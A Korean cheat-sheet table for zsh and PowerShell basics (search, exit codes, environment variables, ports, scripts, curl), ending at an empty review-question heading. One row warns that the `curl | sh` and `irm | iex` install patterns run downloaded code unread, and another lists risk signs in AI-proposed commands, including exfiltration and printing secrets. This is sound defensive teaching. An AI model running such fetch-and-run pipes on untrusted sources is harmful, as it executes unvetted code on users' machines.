| 파일 찾기 | `find . -name "*.py" -not -path "*/.venv/*"`(패턴은 따옴표로). `Get-ChildItem -Recurse -Filter *.py \| Where-Object FullName -notlike '*\.venv\*'` |
| 내용 찾기 | `grep -rn 패턴 폴더`(`-i`, `-v`, `-c`, `-w`, `--include`, `--exclude-dir`), 정규 표현식 `^`, `.`. `Select-String`은 기본으로 대소문자를 구분하지 않는다(`-CaseSensitive`, `-NotMatch`, `-Raw`). ripgrep `rg`는 숨김·바이너리·(Git 저장소 안에서) `.gitignore`를 건너뛴다 |
| 세기 | `cut \| sort \| uniq -c \| sort -rn`(`uniq`는 이웃한 것만 합친다). `Import-Csv`(`-Delimiter`, `-Header`) `\| Group-Object 속성 -NoElement \| Sort-Object Count -Descending`. PowerShell의 `sort`는 `Sort-Object`의 별칭이고 `wc`·`uniq`는 없다. `Measure-Object -Line`은 빈 줄을 세지 않는다 |
| 큰 CSV | 열기 전에 크기·줄 수·앞뒤 부분·형식이 틀린 줄을 확인한다 |
| 종료 코드 | 0 성공. zsh `$?`(바로 앞 명령), PowerShell `$LASTEXITCODE`(외부 프로그램)와 `$?`(참·거짓). `grep`은 못 찾으면 1. 실패는 메시지가 아니라 종료 코드로 알린다 |
| 명령 연결 | `&&` 성공하면, `\|\|` 실패하면, `;` 상관없이. 앞 명령에 기대는 명령은 `&&`로. `a && b \|\| c`는 if-else가 아니다 |
| 환경 변수 | zsh는 `export`해야 프로그램에 넘어간다. `이름=값 명령`은 그 명령에만. PowerShell은 `$env:이름`. Windows의 홈은 `USERPROFILE`(`$HOME`은 PowerShell 변수) |
| `PATH` | 앞의 폴더부터 찾는다. `type -a`, `Get-Command -All`로 가려진 것까지 본다. 바꿀 때는 기존 값을 뒤에 붙인다 |
| 셸 설정 파일 | `~/.zshrc`, `$PROFILE`(없으면 만든다, 5.1과 다른 파일, 실행 정책 적용). 별칭·함수·환경 변수. 셸이 시작할 때 읽으므로 새 터미널(또는 `source`, `.`). 설치 뒤에도 새 터미널, VS Code는 완전히 다시 시작. 비밀 값은 적지 않는다 |
| 프로세스 | 실행 중인 프로그램, PID. `ps`, `Get-Process`. 서버는 끝나지 않으므로 터미널을 하나 더(VS Code 분할) |
| 포트 | `localhost`(127.0.0.1)는 이 컴퓨터, 포트는 프로그램을 가리키는 번호, 한 포트에 한 프로그램. 사용 중이면 `lsof -nP -i :8000` → 확인 → `kill PID`, `Get-NetTCPConnection -LocalPort 8000 -State Listen` → `OwningProcess` → 확인 → `Stop-Process -Id`. 이름으로 멈추지 않는다 |
| 스크립트 | `.sh`: 셔뱅, `set -e`, `cd "$(dirname "$0")"`, `chmod +x`, `./`. `.ps1`: `param`, `$ErrorActionPreference`·`$PSNativeCommandUseErrorActionPreference`, `$PSScriptRoot`, `Push-Location`. 여러 운영체제면 파이썬(`subprocess.run([sys.executable, ...])`) |
| `curl` | Windows는 `curl.exe`. `-i` 헤더, `-o`/`-O` 저장, `-L` 따라가기, `-f` 실패를 종료 코드로, `-s` 조용히. PowerShell은 `Invoke-RestMethod`가 JSON을 객체로 |
| 설치 명령 | `curl \| sh`, `irm \| iex`는 받은 내용을 읽지 않고 실행한다. 출처·패키지 관리자·먼저 읽기·권한·설치 뒤 변경을 확인한다 |
| AI가 실행하려는 명령 | 조각으로 나누고, 프로그램·대상·하는 일·되돌릴 수 있는지를 읽는다. 위험 신호(지우기, 넓은 범위, 권한, 출처 모를 코드, 비밀 값 출력, 밖으로 보내기, 실패 숨기기)가 있으면 확인한 뒤 허락한다. 계속 허락은 좁게 |

## 확인 문제
